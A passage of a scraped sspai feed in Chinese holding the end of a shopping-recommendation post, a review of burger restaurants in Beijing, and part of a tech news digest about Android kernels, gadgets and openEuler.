叕给我了好玩意，就是这款普特博的便携洗手液。一般的洗手液再小怎么着也得有个瓶子，把液体封装到这么小包装里的本獭还是第一次见到，包装很紧致，一开始有点担心装到包里受到挤压会裂开，结果实验性的踩了几脚竟然没事儿，看来也不用太过担心。</p>\n<p>只需要挤压背面的虚线，啪的一声包装就会裂开了，流出的洗手液揉搓至干即可，用起来和常见的免洗洗手液没什么区别。单个包装很小，很适合出门前随身带上那么两三个，一盒有 50 片。在疫情反复出现的最近，不是所有室外场景都有便携清洁手部的条件，在聚餐、出差旅游时这也算得上是消毒湿巾之外的另一种选择。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/19/05a4a70f82c6f933fec89a91a57c6b58.gif\"></figure><h3>少数派疫况便携酒精湿巾</h3>\n<p>￥39 到手 20 包</p>\n<p>🛒<a href=\"https://item.taobao.com/item.htm?id=612240689945\" target=\"_blank\">点这买 &gt;</a></p>\n<p>相信大家也知道除了戴好口罩，勤洗手也是防疫中非常重要的措施，因此这款少数派定制的 75% 酒精的消毒湿巾，助你随时保持洁净。除了 75% 酒精、水和制成湿巾的无纺布外，消毒湿巾没有多余成分。在有效消除细菌、病毒的同时，也不会对你产生副作用。一套 10 包，每包 10 片装，分量刚好既方便携带，也可以避免开启后长时间没用完所导致的污染或酒精挥发。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/25/article/dbe109c795525ab364cc87d4f6f5ee00\"></figure><h3>闪极超级移动电源</h3>\n<ul>\n<li>基础版￥1239 <s> 原价￥1299 </s>\n</li>\n<li>豪华版￥1528 <s>原价￥1598</s>\n</li>\n</ul>\n<p>🛒<a href=\"https://item.taobao.com/item.htm?ft=t&amp;id=656064273285\" target=\"_blank\">点这买 &gt;</a>（上新期间额外送一条价值 ￥99 元的 Lightning 编织线）</p>\n<p>@路中南 ：在办公室收到货后就赶紧点亮这个特色搞活小屏幕，IPS 的屏幕至少不会像 OLED 那样长时间显示烧屏，显示的内容也足够多彩精致，配得上颜值。输入输出功率都可以看到，也能看到电压电流，基本也能猜出是否握手了快充协议。</p>\n<p>100W 的输入输出、25600mAh 的容量，在我看来是这个价位充电宝应该具备的参数。差异化反而体现在我最在意的外观方面，在市面上充电宝走向板砖、箱体形态的今天，闪极这款圆润又不浪费空间的造型真别具一格。</p>\n<p><strong>相关体验：</strong><a href=\"https://sspai.com/post/67734\" target=\"_blank\">新玩意 071 - 闪极 100W 全透明超级移动电源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/15/article/a4af48e191fec0978088cc4cab9c5f08?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\"></figure><h3>征拓 Zendure SuperMini 移动电源</h3>\n<p>￥168 <s>原价￥198</s></p>\n<p>🛒<a href=\"https://item.taobao.com/item.htm?spm=a1z10.3-c-s.w4002-22968806714.12.2b6961f0UL0Iky&amp;id=624918843222\" target=\"_blank\">点这买 &gt;</a></p>\n<p>10000 毫安的容量日常使用刚好，仅一包纸巾大小的身板、丰富的接口类型加上 PD 和 QC 齐全的通用快充协议，华为、Apple 设备都可以快充，再小的包包里似乎都能给它找到一席之地，带上出门也能多一分安心。</p>\n<p><strong>相关体验：</strong><a href=\"https://sspai.com/post/62283\" target=\"_blank\">一包纸巾大小的移动电源：Zendure SuperMini</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/08/2ac56b593bc1d5ebe4f3ada8d59157f7.jpg?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\"></figure><h3>少数派 × JSAUX 联名充电套装</h3>\n<ul>\n<li>单头：￥69 <s>原价￥79</s>\n</li>\n<li>套装：￥129 <s>原价￥139</s>\n</li>\n</ul>\n<p>🛒<a href=\"https://item.taobao.com/item.htm?id=629599437406\" target=\"_blank\">点这买 &gt;</a></p>\n<p>推出了将近一年，这款充电头已经成为了我派商店的销量常青树。而 20W PD 充电器的行列中，它也还依旧称得上是小巧玲珑。更友好一点的折叠插脚设计节省空间，比苹果原装的 18W 充电头还小，充电功率却达到了 20W，可以为你的手机、平板或其他数码设备提供更快的充电速度。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/25/article/a1dcf00a8cec9bd74a26def14f8e8623\"></figure><h2>🏬 其他产品也值得一看</h2>\n<p>🦷 <a href=\"https://item.taobao.com/item.htm?ft=t&amp;id=651793607651\" target=\"_blank\">点这买秒新 漱口水&gt;</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/26/article/4b8f709acc32d99b86b76f7feb7f0050\"></figure><p>👟 <a href=\"https://item.taobao.com/item.htm?ft=t&amp;id=652981295164\" target=\"_blank\">点这买小仓熊 小白鞋清洁套装&gt;</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/26/article/5f20121f3f102e0fd57657e42d112632\"></figure><p>🎮 <a href=\"https://item.taobao.com/item.htm?ft=t&amp;id=650605369312\" target=\"_blank\">点这买极想 Switch 挎包&gt;</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/26/article/ab6182e5732030417ca337491e090db3\"></figure><p>🍚 <a href=\"https://item.taobao.com/item.htm?ft=t&amp;id=640845116066\" target=\"_blank\">点这买若饭 液体版&gt;</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/26/article/2ff634165491a62342fd0fb0051a9ef5\"></figure><p>📌 <a href=\"https://item.taobao.com/item.htm?ft=t&amp;id=625599542131\" target=\"_blank\">点这买 Lopper 数码收纳板&gt;</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/26/article/58a2b93c93620a0b816ec75b3ee64bf9\"></figure><p>🍵 <a href=\"https://shop11352888.m.youzan.com/wscgoods/detail/1y7n0xc75fl4g\" target=\"_blank\">点这买 Artiart 不倒杯&gt;</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/26/article/631f2b116f2c1385696bb91f8c48b13b\"></figure><p>😶‍🌫️ <a href=\"https://shop11352888.m.youzan.com/wscgoods/detail/276d1m08kb9jk\" target=\"_blank\">点这买材慧 眼镜防雾布&gt;</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/26/article/cf641be832c985381c489dbf4412c236\"></figure><p>👀 <a href=\"https://item.taobao.com/item.htm?ft=t&amp;id=636970740567\" target=\"_blank\">点这买几素 蒸汽热敷眼罩&gt;</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/26/article/1ffe390673e134957f58463d2f798c3f\"></figure><p>☕ <a href=\"https://item.taobao.com/item.htm?ft=t&amp;id=642715254884\" target=\"_blank\">点这买博的 电热水杯&gt;</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/26/article/9324762a4d9de47a1e7ff095c99b29c4\"></figure><p>&gt; 关注少数派 <a href=\"https://shop549593764.taobao.com/index.htm?spm=2013.1.w5002-18497266160.2.2fa346beBU2yc8\" target=\"_blank\">官方周边淘宝店</a> / <a href=\"https://weibo.com/u/6293993963\" target=\"_blank\">@吃派的水獭</a>，了解更多新奇有趣的科技产品 🏬</p>\n<p>&gt; 工作摸鱼好伙伴，少数派<a href=\"https://item.taobao.com/item.htm?id=656156847801\" target=\"_blank\">「监工水獭」</a>挂灯公仔现货发售中 🦦</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/68979"},{"title":"人在北京，想吃汉堡：我的探店与踩坑经历","date":"2021-09-26 03:30:19","description":"\n<p><strong>Matrix 首页推荐</strong></p>\n<p><a href=\"https://sspai.com/matrix\">Matrix</a> 是少数派的写作社区，我们主张分享真实的产品体验，有实用价值的经验与思考。我们会不定期挑选 Matrix 最优质的文章，展示来自用户的最真实的体验和观点。</p>\n<p>文章代表作者个人观点，少数派仅对标题和排版略作修改。</p>\n<hr>\n<p>其实我也不知道少数派为什么流行吃汉堡，不过，一只好吃的汉堡总是可以让人觉得很幸福——松软的面包、酥脆的炸物、新鲜的生菜、多汁的肉饼，还有独特的酱料作为美味的催化剂。汉堡可能在日常生活中过于常见了，不过，想把这种常见的东西做到好吃，其实也不太容易。</p>\n<p>这篇文章并非要教大家做汉堡——我也没有那个能耐——而是帮大家探探店、踩踩坑，在北京市内找了几家比较有特色，或者是比较知名的做汉堡的西餐厅，<s>（下血本）</s>代大家品尝一下这飘洋过海而来的美味主食之中的奥妙风味，以一个普通消费者的视角，做一些评价。</p>\n<p><i><strong>声明：</strong>以下卡片中的❤️图标为作者个人主观评价，我会在文章中比较详细说明这款汉堡在我看来的优缺点，供大家评判。同时，以下餐厅排序不分先后。</i></p>\n<h2>Side Street 街旁</h2>\n<h3>\n<strong>🍔 </strong>汉堡：套路深</h3>\n<ul>\n<li>🥬 主要配料：面包、牛肉饼、圆生菜、番茄、洋葱、青椒，辣蛋黄酱、莎莎酱、牛油果酱、玉米片</li>\n<li>🍟 配菜：可选配薯条（15 元，推荐加一个，特别好吃）</li>\n<li>💰 价格：78 元</li>\n</ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c55a2llb34te2r9sarvg.jpeg\"></figure><h3>🍔 汉堡：绝代佳人</h3>\n<p>🥬 主要配料：双层肉馅、熔岩奶酪、IPA 焦糖洋葱、招牌 KO 酱</p>\n<p>🍟 配菜：可选配薯条（15 元）</p>\n<p>💰 价格：78 元</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c55a2mdb34te2r9sas00.jpeg\"></figure><p>在北京的汉堡店可能真的都挺扎堆的。如果你在大众点评搜索的话，会发现排名比较靠前的那几家里面，有好几家店都在交道口附近。这家也不例外——藏在一家麦当劳旁边的院子里，连个大招牌都没有，还是两个外国人在门口聊天，直觉才告诉我这家可能就是我要去的「街旁」汉堡店。</p>\n<p>这里的汉堡都有比较有趣的名字——比如我今天要介绍的两款，「套路深」和「绝代佳人」。前者真正地让我体验到了什么叫作口感的「爆炸」：一大口吃进去，肉饼香、蛋黄酱、牛油果酱、玉米片、面包……所有的配料的味道都在嘴巴里面混合爆发，一时间，肉饼的油腻已经消失了，剩下的却是一股清新的味道，转瞬又变成了玉米片的酥脆，下一秒却又是现烤面包的麦香——或许，我还从来没吃过口感这么丰富的汉堡。</p>\n<p>不过，这款汉堡的水分比较多，如果你不尽快把它吃完，水分渗透到底部的面包，会让面包变得软塌塌的，影响口感。</p>\n<p>「绝代佳人」这是这家汉堡的招牌。这款汉堡的主要配料是牛肉饼、奶酪、洋葱与 KO 酱。我没有亲口尝试这款汉堡，不过据同行的朋友，这款汉堡主要胜在了分量（毕竟是双份肉饼）与酱料的鲜香。</p>\n<p>街旁餐厅的装饰就很街旁——座椅特别设置成了那种 patio furniture（尽管我是坐在了沙发座上），内墙装饰也是路灯，而我们作为旁边就是一排卷闸门一般的金属墙 —— 总之，就是有街边小摊的那种感觉啦！如果你来北京的话，我觉得真的可以推荐一下这家汉堡餐厅。</p>\n<h2>3 Little Pigs' 三小猪</h2>\n<h3>🍔 汉堡：牛肉酱奶酪汉堡</h3>\n<ul>\n<li>🥬 主要配料：面包、牛肉饼、微辣牛肉酱、煎洋葱、番茄以及 Cheddar 奶酪</li>\n<li>🍟 配菜：炸薯球</li>\n<li>💰 价格：70 元（单份肉饼）/ 93 元（双份肉饼）/ 118 元（三份肉饼）</li>\n</ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c55a2n5b34te2nr88k9g.jpeg\"></figure><p>「『堡』香不怕巷子深」，大概说的就是这家「三小猪」餐厅。它隐藏在东城区一条谧静的胡同之中。我记得我和朋友去这家餐厅的时候正值隆冬，昏暗的灯光与夜晚的寒气，让整条胡同显得幽长而又阴森。我们确认了半天，才终于在一处不起眼的石墙之上，看到了不算太大的「三小猪」招牌，这才拐进了旁边的民居。</p>\n<p>这家的招牌汉堡是手撕猪肉堡。不过，我不是很喜欢猪肉堡，所以还是要了牛肉。如果你坐在这家店的吧台，你就可以看到汉堡从下单到端上来的全过程——毕竟厨房近在咫尺，师傅们一举一动我们都看得清清楚楚。</p>\n<p>有关这款汉堡，我最喜欢的可能不是汉堡本身，而是它别出心裁的配餐薯球——这道小吃尽管在美国可能是常备菜，国内的快餐厅倒是很少见到，我记得萨莉亚好像有，但是品质并不如这里的配菜高。一口一个，可以说是既有薯条的那种香气，又有酥脆的口感，简直停不下来。</p>\n<p>好了，不要再跑题了，咱来说说他们的汉堡。现煎的肉饼自然是汁水饱满，而这个牛肉酱的搭配则给予这款汉堡以厚重的口感。如果你觉得太腻了也没关系，毕竟汉堡中还夹着几片生菜和一些番茄，可以解腻。如果你觉得还不够腻，那……三小猪还有十分特色的炸猪皮当作小食，推荐你也来一份。如果觉得受不了酸辣的，也可以点原味。不过，我个人觉得酸辣味才够过瘾。</p>\n<p>这家店店面相当小，店里也比较拥挤，桌子不过三四张，大部分人都坐在了吧台（一共也就七八个位置）。所以，如果是想要去的话，还是规划好自己的时间。</p>\n<h2>Bluefrog 蓝蛙西餐厅</h2>\n<h3>🍔 汉堡：BBQ 风味牛堡（七分熟）</h3>\n<ul>\n<li>🥬 主要配料：全麦面包、芝士、牛肉饼、炸洋葱碎、BBQ 风味烧烤酱</li>\n<li>🍟 配菜：薯条、小份沙拉（藜麦与甘蓝）</li>\n<li>💰 价格：88 元</li>\n</ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c55a2ntb34te12vuo9tg.jpeg\"></figure><p>蓝蛙餐厅是比较知名的连锁西餐厅，人均消费大概 150 元人民币。所以，我也并未期待它的汉堡能够有多么惊艳，但是「标准的好吃」是最低期待。</p>\n<p>果然，我点的这份 BBQ 风味牛肉堡并没有让我失望：汉堡本身上来的时候还热乎，而且摆放的方式也十分整齐。选择七分熟，是因为熟度恰好能够保存住肉饼的汁水不会过分外溢（吃过一次全熟之后，如果能选，我再也不会选全熟的汉堡了）——咬一口，肉香四溢的同时，浓郁的烧烤酱的酸甜味道也充满唇齿之间，的确是一种享受。</p>\n<p>若要说有什么美中不足，那就是他家这次汉堡的炸洋葱碎已经不太新鲜——这直接导致了这个汉堡失去了本来应该有的一次酥脆口感，整体变得有点过于软趴趴的。我后来专门把洋葱碎抽出来单独吃了一点儿，发现果真不行，都有点儿咬不动了。不过，我相信如果吃的次数足够多，总是可以遇到新鲜炸制的洋葱碎的（手动狗头）。</p>\n<p>配菜是薯条和超级小份的沙拉，算是汉堡的常规配置。薯条的确是现炸的，不仅有些烫嘴，火候也正好，要比一般西餐厅炸出来的酥脆一些，况且还没有那么油腻，所以我还比较喜欢，竟然就着金汤力吃完了。</p>\n<p>对了，我还点了一杯蓝蛙特调的金汤力——加入了蓝色的蓝柑橘利口酒，并且用草莓点缀，这杯酒除了金汤力一贯的清冽酸甜之外，还有淡淡的果香与诱人的颜色。</p>\n<h2>Shake Shack</h2>\n<h3>🍔 汉堡：Shake Shack 招牌牛肉汉堡</h3>\n<ul>\n<li>🥬 主要配料：面包、芝士、牛肉饼、新鲜番茄片、生菜、Shake Shack 酱料</li>\n<li>🍟 配菜：无</li>\n<li>💰 价格：51 元</li>\n</ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c55a2olb34te2hplttc0.jpeg\"></figure><p>Shake Shack 可谓是「传统意义上的」汉堡餐厅。美式汉堡中，Shake Shack 的名气很响。这个在美国可能只能算得上「国民级」的汉堡店，到了中国可谓是摇身一变，看起来高端了不少，人均也来到了 100 元上下。不过，这种高端可能真的基本只体现在了价格上。</p>\n<p>Shake Shack 的这款招牌牛肉汉堡的分量尚可，吃的时候也能判断出是用了比较新鲜的食材，口感也不错，牛肉饼的熟度比较适中，原汁原味；但是，本该作为灵魂存在的酱料却并没有给人太大的惊喜。这种比较平淡的口感，加之这样夸张的价格，让我很难真的爱上这里的汉堡。再加上平常路边摊一般的就餐体验，以及自助式的点餐和取餐，让我真的觉得这里可能就是一家更高级的汉堡王罢了。后面我又尝试了一款这里的辣椒牛堡，也并没有想象中那么惊艳。</p>\n<p>Shake Shack 的名字中就有 shake（奶昔），所以，他家的奶昔相对而言会比较好喝。就大家普遍的评价来看，对他们奶昔的赞誉也要明显多于汉堡。北京的门店里还有特殊风味的冰糖葫芦风味奶昔可以尝试。不过，作为一名乳糖不耐症患者，我是无福消受了。</p>\n<h2>Slow Boat 悠航鲜啤</h2>\n<h3>🍔 汉堡：邋遢周汉堡</h3>\n<ul>\n<li>🥬 主要配料：牛肉饼、烤茄子、洋葱</li>\n<li>🍟 配菜：无</li>\n<li>💰 价格：53 元</li>\n</ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c55a2pdb34te12vuo9u0.jpeg\"></figure><p>悠航鲜啤的大名我真的久仰——我记得还是去年年底，我就想到这里打卡他们家的汉堡和啤酒，然而直到今年年中我才最终成行。这家餐厅位于北京朝阳区三里屯（灯市口似乎也有分店），并非处在过分闹市的地方，不过如果你去得稍晚，排队也是不可避免。这家的装修风格比较考究，是比较工业风格的方式，搭配的桌椅也是金属质感浓厚。再加上随处可见的大型啤酒酿桶，可能让人仿佛置身于一家啤酒厂中。</p>\n<p>我这次点的是「邋遢周」汉堡。单从名字来看，这款汉堡可能是 Sloppy Joe 汉堡的中国改良版——事实也是如此。不过相比真正有点「邋遢」的 Sloppy Joe，这款汉堡还是用到了真正的成型的肉饼。此外汉堡中还包含了烤茄子、烤蔬菜和洋葱，所以口味层次还算比较丰富。上来的时候这里的汉堡都被从中间拦了一刀，我个人对这种设计并不是很满意（汉堡就是应该用满口的食材让味道在嘴里爆炸啊！），不过可能会比较方便食用。</p>\n<p>值得一提的是，汉堡与啤酒是很美味的搭配。这家餐厅有超过 50 种不同的啤酒可以选择，涵盖了各种不同的口味与香气，让人觉得有点目不暇接。我也不是专家，不好在这里擅自评判，不过我尝试的一款带有蜂蜜香气的啤酒还真的让我回味无穷。</p>\n<h2>BLT</h2>\n<h3>🍔 汉堡：BLT 招牌培根牛堡</h3>\n<ul>\n<li>🥬 主要配料：面包、牛肉饼、奶酪、洋葱、培根、生菜</li>\n<li>🍟 配菜：薯条，赠送自助沙拉</li>\n<li>💰 价格：88 元</li>\n</ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/22/1deb90adfed1559897fab22a1196fc45.jpg\"></figure><p>一天，我走进商场，打开「大众点评」，就找到了这家 BLT 美式餐厅。实际上，这个招牌汉堡的配料看上去十分吸引人：培根、牛肉、蔬菜、洋葱碎等。但是最后端上来的汉堡却没有满足我内心的期待。考虑到这是一家连锁西餐厅，所以可能出品不太稳定。</p>\n<p>不过，惊喜还是有的：分量十足的同时，洋葱碎至少还是酥脆的，给予这个汉堡一点点让人愉悦的感觉。此外，牛肉饼的火候还算合适，口感比较正常——不能说多么鲜嫩多汁，但是也不至于过于干燥以至于难以下咽。整体的就餐体验也不错，再加上点主食送自助沙拉管饱，我觉得这个价格还算值得。</p>\n<h2>🥚 一个彩蛋：俄餐厅的另类「汉堡」</h2>\n<h3>🍔 汉堡（？）：特色猪排</h3>\n<ul>\n<li>🥬 主要配料：芝士、猪肉饼、蔬菜、蛋黄酱、黑面包</li>\n<li>🍟 配菜：薯条、俄式腌菜</li>\n<li>💰 价格：52 元（一道菜中有 2 个）</li>\n</ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c55a2qtb34te12vuo9ug.jpeg\"></figure><p>俄餐中的肉饼我大概不止一次提过了，老井餐厅也在之前的文章中向大家介绍过。不过，最近一次去这家餐厅，点了一次他们的特色猪肉饼，上来之后，看起来却像是一只汉堡一样。看似传统的俄式做法——肉饼上面铺满了融化的芝士——之下，你却能找到一些令人惊喜的蔬菜作为配菜，以及一片香气四溢的黑面包，让这道菜说成是一种特别的汉堡也一点都不过分。口味上，这款肉饼除了肉香之外，你还能尝到芝士的那种特别的香气与顺滑口感，以及腌制蔬菜的清新解腻。</p>\n<p>配菜中也出现了十分具有俄罗斯特色的腌蘑菇，让人一时间分不清楚，这道菜到底应该如何归属。</p>\n<h2>也说说我爱吃的「平价」汉堡</h2>\n<p>上面提到的这七家店、八款汉堡，好吃是好吃，但是这个价格，是自然不可能经常去吃的（有钱任性除外）。不过，就算是平常在快餐店吃到的那些汉堡，其实有些时候也不一定比上面说到的汉堡差。下面我也简单推荐一些在麦当劳和汉堡王的几款我最喜欢的汉堡，如果你也有和我类似的口味的话，不妨去试一试。</p>\n<h3>麦当劳</h3>\n<p>我吃麦当劳的频率可以说很高了，一周怎么也得有四次吧。所以，麦当劳的所有汉堡我基本都尝试过，这里说一说我觉得最好吃的。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/22/8070a4d0739a6ab99058fb11d1912a05.jpg\"></figure><p>麦当劳在售的几款汉堡中，我觉得最喜欢的可能是<strong>板烧鸡腿堡</strong>。这主要是因为板烧鸡腿堡的肉饼——鸡腿——咸香、多汁而不是很油腻，口感适中。另外，<strong>麦辣鸡腿堡</strong>我也很喜欢，当运气好的时候，那块腿排刚炸出来，热混合着辣，让人直冒汗的同时也只能大呼过瘾 —— 尤其是此时再啜一口冰可乐。</p>\n<p>麦当劳的牛肉汉堡，总是差那么一点儿意思。不过，<strong>培根蔬萃汉堡</strong>可能是个中翘楚。这款汉堡的分量可能是除了巨无霸和几款安格斯牛堡之外最重的，也是最让我觉得舒服的。蕃茄酱的调适让整个汉堡呈现出一种酸甜的口感，培根与牛肉的感觉也很搭配，口味丰富、层次分明。</p>\n<p>尽管最近我很少吃到，不过<strong>麦香鱼</strong>和<strong>双层鱼堡</strong>也是麦当劳餐厅中我个人十分喜欢的汉堡种类。麦香鱼用的是麦香鱼酱，只有一层鱼肉饼；双层鱼堡则是芝麻酱，有两层鱼肉饼。麦当劳的鱼肉饼，如果你运气好的话，现炸的，极为鲜嫩，大海的气息扑面而来；不过，如果运气不太好，那么整个汉堡可能都已经像蔫儿了一样起了褶皱，口感自然是大打折扣。</p>\n<h3>汉堡王</h3>\n<p>汉堡王，因为开店的密度明显不如麦当劳，所以……吃的次数的确不多。不过，在我看来，你在这里既可以吃到比较高端的一些汉堡，也可以选择一些比较便宜的、小的汉堡搭配套餐填饱肚子。不过，吃了这么多次汉堡王，<strong>猪肘堡</strong>无疑是我最喜欢的汉堡——那种软糯弹牙的口感与香甜的口味，谁会不爱呢？只是可惜，现在已经不在售了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c55a2s5b34te2nr88ka0.jpeg\"></figure><p>此外，汉堡王常常会售卖的 25 元四件套中的<strong>狠霸王鸡堡</strong>，确实够狠，便宜、大碗、香。味道上，这款汉堡可能不如麦当劳的几款鸡肉堡那么出色，但是这个性价比实在是太高了——我常常是吃完一个堡就已经饱了，但实际上还有三样东西没开动。</p>\n<h2>写在最后</h2>\n<p>汉堡尽管是「漂洋过海」而来，却也已经成为现代都市生活之中不可或缺的一部分了。价格可高可低、吃起来可快可慢可享受，填饱肚子的同时，似乎也能够品味生活。</p>\n<p>毕竟说不定，正在看这篇文章的你，正拿着汉堡准备大快朵颐。</p>\n<p>&gt; 下载少数派 <a href=\"https://sspai.com/page/client\">客户端 </a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号 </a>，了解更妙的数字生活 🍃</p>\n<p>&gt; 想申请成为少数派作者？<a href=\"https://sspai.com/apply/writing\">冲！</a></p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/68920"},{"title":"派早报：Google 计划让 Android 内核更接近 Linux、AngryMiao 发布 Cyberboard 冰川套装键盘等","date":"2021-09-26 00:49:08","description":"\n<h2>你可能错过的新鲜事</h2>\n<h3>Google 计划让 Android 内核更接近 Linux</h3>\n<p>Google 花费了近五年时间让 OEM 可以更容易的更新 Android 版本 并推出了 Project Treble，而在本周 Linux Plumbers Conference 上，Google 表示将更进一步的让 Android 内核更接近上游的 Linux 内核，尽量减少传统的软件分叉——以往在Android 设备升级时会需要对 Linux 进行多次分支操作：先从 Linux 到 Android 通用，再到特定的 SoC 版本再对设备更新，而后面的通用内核映像未来将会被简化，制造商只需要将各自的更改插入核心内核中，而不是进行多次分支操作，而这一改变将从 2023 年开始，Pixel 6 有望成为第一款搭载 GKI 和 Linux 内核 5.10 的 Android 设备。<a href=\"https://www.androidpolice.com/2021/09/24/google-plans-to-bring-androids-kernel-closer-to-the-linux-upstream/\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c57s13db34tehemeg120.png\"></figure><h3>AngryMiao 发布 Cyberboard 冰川套装键盘</h3>\n<p>9 月 17 日，AngryMiao 怒喵科技发布了 CYBERBOARD 冰川套装键盘，该设备采用了半透明 PC 材质，并延续了 ANSI 配列以及 LED 像素阵列，并配有 Top Mount+ 硅胶减震垫的结构方式。该设备目前已售罄，定价为 3800 元。<a href=\"https://www.angrymiao.com/glacier/\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c57s13lb34teho7grckg.png\"></figure><h3>realme 发布真我 Buds Air 2 黑薄荷耳机</h3>\n<p>9 月 24 日，realme 正式发布了真我 Buds Air 2 黑薄荷 TWS 耳机，该设备采用了荧光绿和黑色的撞色设计，并配备入耳式耳塞，搭载 10mm 类钻石振膜动圈单元。满足 AAC、SBC 编码，并提供 Bass Boost + 复合低音强化方案。续航方面，加上充电盒可以在降噪模式下允许 22.5 小时。零售价 299 元，首发售价 249 元。<a href=\"https://buy.realme.com/cn/goods/370?id=834?inviteId=453340392\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c57s13tb34teho7grcl0.png\"></figure><h3>三星宣布 Galaxy M52 5G 手机即将发布</h3>\n<p>9 月 25 日，三星方面正式宣布 Galaxy M52 将于 9 月 28 日在印度地区发布。该设备将搭载高通骁龙 778G 芯片，配备 6.7 英寸 120Hz Super AMOLED 显示屏，采用了 64MP 以及 F1.8 光圈主摄像头，拥有 5000mAh 容量的电池，并支持 25W 快充。<a href=\"https://www.gsmarena.com/samsung_galaxy_m52_5g-11110.php\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c57s145b34tehr0hgcj0.png\"></figure><h3>高德地图推出高清导航功能</h3>\n<p>高德地图于 9 月 24 日正式推出可以精准还原实景车道的高清导航功能，该功能适用于大部分主流 Android 和 iPhone 机型，可以精准的还原 3D 实景车道、路口引导更为清晰，如果路段内有公交车道、长实线等需要驾驶员额外注意的标识时，高德地图将会高亮显示，避免车辆违章。目前已经支持天津市、重庆市、河北省、四川省、浙江省、江苏省、广东省等近 80 个城市的高速和城市快速路。<a href=\"https://www.ithome.com/0/577/312.htm\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c57s14lb34teho7grclg.png\"></figure><h3>华为发布 openEuler 欧拉操作系统</h3>\n<p>华为于 9 月 25 日在其全联接大会上正式发布 openEuler 欧拉操作系统，该系统为开源的 Linux 发行版，将通过开放的社区形式与全球的开发者共同构建软件生态体系。同时将其原先主要服务鲲鹏重新定位为未来的数字基础设施操作系统。「华为未来将重点打造两个操作系统鸿蒙、欧拉，同时都进行开源。鸿蒙应用于智能终端、物联网终端、工业终端；欧拉应用于服务器、边缘计算、云基础设施。」<a href=\"https://www.ithome.com/0/577/450.htm\" target=\"_blank\">来源</a></p>\n<h3>《英雄联盟》首部动画定档：11 月 7 日全球同步播出</h3>\n<p>《英雄联盟》官方微博于 9 月 25 日正式宣布，《英雄联盟》动画正式定档，将于 11 月 7 日全球同步播出，同时放出了《英雄联盟：双城之战》全球首支正式预告片，剧集信息显示为九集动画，此前《英雄联盟》官方曾经公布部分动画片段，展现幼年金克丝和蔚姐妹天台谈心的温馨场面，并且两人在对话中提到的蓝色晶石小秘密。<a href=\"https://www.ithome.com/0/577/540.htm\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c57s14tb34tehemeg12g.png\"></figure><p> </p>\n<h2>看看就行的小道消息</h2>\n<ul>\n<li>近期有关大疆 Mavic 3 Pro 无人机的相关信息得到爆料，该无人机将提供 5.2K 分辨率视频拍摄，以及 2000 万像素静态照片的拍摄，续航可达 46 分钟。<a href=\"https://www.theverge.com/2021/9/23/22690821/dji-mavic-pro-drone-leak-twin-cameras-four-thirds\" target=\"_blank\">来源</a>\n</li>\n<li>据外媒信息透露，AMD 或将与联发科联合成立相关科技公司，进行高度整合化的笔记本 ARM SoC 开发。<a href=\"https://www.expreview.com/80505.html\" target=\"_blank\">来源</a>\n</li>\n<li>根据 XDA 挖掘代码发现 Pixel 6 中相机 App 新增了部分参数和新功能，其中包含超广角前摄、4K 60fps 录制、手动白平衡、魔术橡皮擦、人脸去模糊、场景锁定等等。<a href=\"https://www.xda-developers.com/google-pixel-6-camera-features-revealed/\" target=\"_blank\">来源</a>\n</li>\n<li>爆料者 @AppleLe257 在 Twitter 上公布了 Pixelbook 2 相关产品参数，新机将采用铝合金外壳，具有多彩配色，屏幕为 13.3 